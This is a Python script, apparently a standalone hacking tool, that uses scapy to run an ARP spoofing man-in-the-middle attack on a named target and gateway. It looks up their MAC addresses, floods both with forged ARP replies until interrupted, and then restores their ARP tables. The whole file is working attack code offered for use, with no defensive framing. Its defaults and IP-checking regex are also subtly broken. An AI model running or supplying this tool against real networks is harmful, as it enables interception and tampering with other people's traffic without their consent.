#! usr/bin/env python

import scapy.all as scapy
import time
import re
import argparse

TIMEOUT = 2
SLEEP = 2


# get args from the command line and return them
def get_options():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target",
                        help="Specify the target's IP address")
    parser.add_argument("-g", "--gateway", dest="gateway",
                        help="Specify the gateway's IP address")
    parser.add_argument("-a", "--timeout", dest="timeout",
                        help="MAC scanner timeout. Default 2")
    parser.add_argument("-s", "--sleep", dest="sleep",
                        help="Sleep time between consecutive ARP packets. Default 2")

    return parser.parse_args()


# check the user input
def check_options(options):
    ip_regex = "\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}"

    # no argument
    if not options.target and not options.gateway:
        print("Print -h for help")
        return False
    # no target's IP specified
    if not options.target:
        print("No target specified. Add --target IP address")
        return False
    # no gateway's IP specified
    if not options.gateway:
        print("No gateway specified. Add --gateway IP address")
        return False
    # wrong target's IP
    if not re.fullmatch(ip_regex, options.target):
        print("Incorrectly specified target's IP address")
        return False
    # wrong gateway's IP
    if not re.fullmatch(ip_regex, options.gateway):
        print("Incorrectly specified gateway's IP address")
        return False
    # check if the timeout is a non-negative digit
    elif not options.timeout.isdigit():
        print("The timeout needs to be a non-negative digit")
        return False
    # check if the sleep is a non-negative digit
    if not options.sleep.isdigit():
        print("The sleep time needs to be a non-negative digit")
        return False
    return True


def get_mac(ip_address, timeout):
    arp_request = scapy.ARP(pdst=ip_address)  # ARP request to get the MAC associated with the specified IP/range of IPs
    ethernet_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # send the request on the broadcast address
    broadcast_packet = ethernet_broadcast / arp_request  # making the arp_request on the broadcast channel packet
    try:
        answer = scapy.srp(broadcast_packet, timeout=timeout, verbose=False)[0]  # store only answered packet
        mac = answer[0][1].hwsrc  # return the first[0] (only) answer[1] (not a request) and extract the MAC
    except IndexError:
        print("Non-existing IP address ["
              + str(ip_address) + "] or too short timeout. Check the IP and try again with longer timeout -a")
        exit()
    return mac


def spoof(ip_dest, mac_dest, ip_spoof):
    arp_spoof = scapy.ARP(op="is-at", psrc=ip_spoof,
                          pdst=ip_dest, hwdst=mac_dest)  # tell device at ip_dest that device at ip_spoof has my MAC
    scapy.send(arp_spoof, verbose=False)


def restore_arp(ip_target, mac_target, ip_gateway, mac_gateway):
    # restore the target's ARP table
    target_arp = scapy.ARP(op="is-at", psrc=ip_gateway, hwsrc=mac_gateway,
                           pdst=ip_target, hwdst=mac_target)
    scapy.send(target_arp, verbose=False)
    # restore the router's ARP table
    gateway_arp = scapy.ARP(op="is-at", psrc=ip_target, hwsrc=mac_target,
                            pdst=ip_gateway, hwdst=mac_gateway)
    scapy.send(gateway_arp, verbose=False)


options = get_options()
if check_options(options):
    timeout = int(options.timeout)
    sleep = int(options.sleep)
    ip_target = options.target
    mac_target = get_mac(ip_target, timeout)
    ip_gateway = options.gateway
    mac_gateway = get_mac(ip_gateway, timeout)
    num_packets = 0
    try:
        while True:
            spoof(ip_target, mac_target, ip_gateway)  # tell the target's computer you're the router now
            spoof(ip_gateway, mac_gateway, ip_target)  # teel the router you're now the target's computer
            num_packets += 2
            print("\r[+] Packets sent: {}".format(num_packets), end="")
            time.sleep(sleep)
    except KeyboardInterrupt:
        print("Program has been finished")
        print("Restoring the ARP tables...")
        restore_arp(ip_target, mac_target, ip_gateway, mac_gateway)
        print("Done.")
